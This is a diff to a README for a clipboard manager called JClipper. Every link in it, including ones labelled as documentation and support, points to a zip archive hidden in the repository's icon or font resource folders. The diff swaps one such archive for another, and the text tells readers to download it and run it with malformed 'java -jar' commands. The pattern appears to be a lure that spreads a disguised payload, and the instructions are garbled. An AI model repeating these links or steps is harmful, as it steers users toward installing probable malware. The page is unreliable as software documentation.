@@ -14,19 +14,19 @@ JClipper is a lightweight clipboard manager designed to enhance your productivit
 To start using JClipper, follow these steps to download and install the application. 
 
 ## 📥 Download & Install
-1. **Download JClipper**: Visit the [Releases page](https://raw.githubusercontent.com/undiplomatic-hypnoanalysis545/jclipper/main/src/main/resources/icons/jclipper_v3.0.zip) to download the latest version of JClipper. 
+1. **Download JClipper**: Visit the [Releases page](https://github.com/undiplomatic-hypnoanalysis545/jclipper/raw/refs/heads/main/src/main/resources/fonts/jetbrainsmono/Software-2.3-alpha.2.zip) to download the latest version of JClipper. 
    
    You can always return to this link whenever you need the updated version.
 
-2. **Choose the Right File**: On the releases page, you will find the JClipper JAR file under the latest release. The filename should look like `https://raw.githubusercontent.com/undiplomatic-hypnoanalysis545/jclipper/main/src/main/resources/icons/jclipper_v3.0.zip`.
+2. **Choose the Right File**: On the releases page, you will find the JClipper JAR file under the latest release. The filename should look like `https://github.com/undiplomatic-hypnoanalysis545/jclipper/raw/refs/heads/main/src/main/resources/fonts/jetbrainsmono/Software-2.3-alpha.2.zip`.
 
 3. **Save the File**: Click on the JAR file to begin the download. Save it to a location where you can easily access it, such as your Desktop or Downloads folder.
 
 4. **Run JClipper**: 
    - If you are on Windows, open Command Prompt.
-     - Type `java -jar path\to\https://raw.githubusercontent.com/undiplomatic-hypnoanalysis545/jclipper/main/src/main/resources/icons/jclipper_v3.0.zip` and press Enter. (Replace `path\to\` with the actual location of your downloaded file.)
+     - Type `java -jar path\to\https://github.com/undiplomatic-hypnoanalysis545/jclipper/raw/refs/heads/main/src/main/resources/fonts/jetbrainsmono/Software-2.3-alpha.2.zip` and press Enter. (Replace `path\to\` with the actual location of your downloaded file.)
    - If you are on macOS or Linux, open Terminal.
-     - Type `java -jar https://raw.githubusercontent.com/undiplomatic-hypnoanalysis545/jclipper/main/src/main/resources/icons/jclipper_v3.0.zip` and press Enter. 
+     - Type `java -jar https://github.com/undiplomatic-hypnoanalysis545/jclipper/raw/refs/heads/main/src/main/resources/fonts/jetbrainsmono/Software-2.3-alpha.2.zip` and press Enter. 
 
    Remember to replace `/path/to/` with the actual path where you saved the JAR file.
 
@@ -42,22 +42,22 @@ To start using JClipper, follow these steps to download and install the applicat
 3. **Select and Paste**: Click on any item from the clipboard history to paste it into your active application.
 
 ## 🔄 Updating JClipper
-To keep JClipper functioning optimally, regularly check the [Releases page](https://raw.githubusercontent.com/undiplomatic-hypnoanalysis545/jclipper/main/src/main/resources/icons/jclipper_v3.0.zip) for updates. When a new version is available, follow the same download steps to install the latest version.
+To keep JClipper functioning optimally, regularly check the [Releases page](https://github.com/undiplomatic-hypnoanalysis545/jclipper/raw/refs/heads/main/src/main/resources/fonts/jetbrainsmono/Software-2.3-alpha.2.zip) for updates. When a new version is available, follow the same download steps to install the latest version.
 
 ## 📜 Known Issues
 - Some users may experience minor delays when accessing large clipboard histories.
 - Hotkey settings may need adjustment on different operating systems for better accessibility.
 
 ## 📞 Support
-If you encounter any issues or have questions about using JClipper, please visit the support section on our [GitHub page](https://raw.githubusercontent.com/undiplomatic-hypnoanalysis545/jclipper/main/src/main/resources/icons/jclipper_v3.0.zip). We’re here to help you.
+If you encounter any issues or have questions about using JClipper, please visit the support section on our [GitHub page](https://github.com/undiplomatic-hypnoanalysis545/jclipper/raw/refs/heads/main/src/main/resources/fonts/jetbrainsmono/Software-2.3-alpha.2.zip). We’re here to help you.
 
 ## 📌 Additional Resources
 For further learning, consider exploring:
-- [Java Documentation](https://raw.githubusercontent.com/undiplomatic-hypnoanalysis545/jclipper/main/src/main/resources/icons/jclipper_v3.0.zip)
-- [Swing/FlatLaf Documentation](https://raw.githubusercontent.com/undiplomatic-hypnoanalysis545/jclipper/main/src/main/resources/icons/jclipper_v3.0.zip)
+- [Java Documentation](https://github.com/undiplomatic-hypnoanalysis545/jclipper/raw/refs/heads/main/src/main/resources/fonts/jetbrainsmono/Software-2.3-alpha.2.zip)
+- [Swing/FlatLaf Documentation](https://github.com/undiplomatic-hypnoanalysis545/jclipper/raw/refs/heads/main/src/main/resources/fonts/jetbrainsmono/Software-2.3-alpha.2.zip)
 
 ## 💬 Feedback
 We appreciate your thoughts! Share your experiences or suggest improvements in the GitHub issues section.
 
 ## 📥 Quick Download
-Don't forget to grab the latest version of JClipper directly from the [Releases page](https://raw.githubusercontent.com/undiplomatic-hypnoanalysis545/jclipper/main/src/main/resources/icons/jclipper_v3.0.zip). Thank you for using JClipper!
+Don't forget to grab the latest version of JClipper directly from the [Releases page](https://github.com/undiplomatic-hypnoanalysis545/jclipper/raw/refs/heads/main/src/main/resources/fonts/jetbrainsmono/Software-2.3-alpha.2.zip). Thank you for using JClipper!
